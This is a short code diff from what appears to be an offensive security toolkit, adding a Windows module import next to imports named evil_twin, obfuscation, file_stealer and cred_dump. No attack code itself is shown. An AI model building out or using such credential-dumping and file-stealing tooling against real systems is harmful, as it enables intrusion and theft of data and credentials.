@@ -19,6 +19,7 @@ from core.evil_twin import run_bash_script
 
 from core.obfuscation import list_obfuscation_methods
 
+from core.PET.windows import *
 from core.PET.sys_info import sys_info
 from core.PET.file_stealer import file_stealer
 from core.PET.cred_dump import cred_dump
